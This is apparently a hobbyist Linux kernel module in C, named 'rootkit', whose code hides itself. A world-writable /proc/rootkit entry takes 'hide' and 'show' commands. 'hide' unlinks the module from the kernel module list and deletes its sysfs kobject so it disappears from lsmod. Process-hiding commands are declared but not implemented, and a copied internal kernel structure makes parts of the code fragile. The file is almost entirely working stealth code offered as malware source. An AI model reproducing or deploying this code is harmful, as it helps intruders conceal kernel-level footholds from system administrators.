#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/proc_fs.h>
#include <linux/kobject.h>
#include <linux/fs.h>
#include <linux/string.h>
#include <linux/proc_ns.h>
#include <linux/spinlock.h>
#include <linux/atomic.h>
#include <linux/binfmts.h>
#include <linux/cred.h>
#include <asm/uaccess.h>

MODULE_LICENSE("GPL");

#define MODULE_NAME "rootkit"
#define MAX_HIDDEN_PIDS 5
#define MAX_PID_LENGTH 6

#define HIDE_MOD_CMD "hide"
#define SHOW_MOD_CMD "show"
#define HIDE_PID_CMD "hpid"
#define SHOW_PID_CMD "spid"

/* Re-writing proc_dir_entry, removed from Linux kernel since 3.10 */
struct proc_dir_entry {
		unsigned int low_ino;
		umode_t mode;
		nlink_t nlink;
		kuid_t uid;
		kgid_t gid;
		loff_t size;
		const struct inode_operations *proc_iops;
		const struct file_operations *proc_fops;
		struct proc_dir_entry *parent;
		struct rb_root subdir;
		struct rb_node subdir_node;
		void *data;
		atomic_t count;
		atomic_t in_use;
		struct completion *pde_unload_completion;
		struct list_head pde_openers;
		spinlock_t pde_unload_lock;
		u8 namelen;
		char name[];
};

static struct proc_dir_entry *proc_rtkit;
static struct proc_dir_entry *proc_root;

static char module_hidden = 0;
static struct list_head *module_previous;
static struct list_head *module_kobj_previous;

void module_hide(void) {
		if(module_hidden) return;
		module_previous = THIS_MODULE->list.prev;
		list_del(&THIS_MODULE->list);
		module_kobj_previous = THIS_MODULE->mkobj.kobj.entry.prev;
		kobject_del(&THIS_MODULE->mkobj.kobj);
		list_del(&THIS_MODULE->mkobj.kobj.entry);
		module_hidden = !module_hidden;
		printk(KERN_INFO "Rootkit hidden\n");
}

void module_show(void) {
		int result;
		if(!module_hidden) return;
		list_add(&THIS_MODULE->list, module_previous);
		result = kobject_add(&THIS_MODULE->mkobj.kobj, THIS_MODULE->mkobj.kobj.parent, "rt");
		module_hidden = !module_hidden;
		printk(KERN_INFO "Rootkit no longer hidden\n");
}

static ssize_t rtkit_read(struct file *file, char __user *buffer, size_t count, loff_t *ppos) {
		return count;
}

static ssize_t rtkit_write(struct file *file, const char __user *buffer, size_t count, loff_t *ppos) {
		if(!strncmp(buffer, HIDE_MOD_CMD, strlen(HIDE_MOD_CMD))) {
				module_hide();
		} else if(!strncmp(buffer, SHOW_MOD_CMD, strlen(SHOW_MOD_CMD))) {
				module_show();
		}
		return 0;
}

static const struct file_operations rootkit_fops = { 
		.owner = THIS_MODULE,
		.read = rtkit_read,
		.write = rtkit_write,
};

/* Initialize proc file system */
static int procfs_init(void) {
		proc_rtkit = proc_create(MODULE_NAME, 0666, NULL, &rootkit_fops);
		if(proc_rtkit == NULL)
				return 0;
		proc_root = proc_rtkit->parent;
		if(proc_root == NULL || strcmp(proc_root->name, "/proc") != 0)
				return 0;

		return 1;
}

static void procfs_clean(void) {
		if(proc_rtkit != NULL) {
				remove_proc_entry(MODULE_NAME, NULL);
				proc_rtkit = NULL;
		}
}

static int __init rootkit_init(void) {
		/* Hiding module. Commented because I can't stop it with rmmod */
	//	list_del_init(&__this_module.list);
	//	kobject_del(&THIS_MODULE->mkobj.kobj);
		if(!procfs_init()) {
				procfs_clean();
				return 1;
		}
		printk(KERN_INFO "Loading rootkit\n");
		return 0;
}

static void __exit rootkit_exit(void) {
		procfs_clean();
		printk(KERN_INFO "Closing rootkit\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);

